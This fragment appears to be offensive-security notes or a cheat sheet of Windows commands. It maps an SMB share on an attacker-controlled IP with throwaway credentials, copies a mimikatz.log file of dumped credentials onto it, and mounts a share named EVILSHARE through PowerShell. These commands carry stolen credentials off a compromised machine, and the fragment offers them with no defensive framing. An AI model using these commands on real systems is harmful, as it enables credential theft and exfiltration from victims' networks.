...
net use m: \\192.168.45.207\ /user:test test
copy mimikatz.log m:\

net view \\192.168.45.207 /user:test test

New-PSDrive -Name "EVILSHARE" -PSProvider "FileSystem" -Root "\\192.168.45.207\EVILSHARE"
```
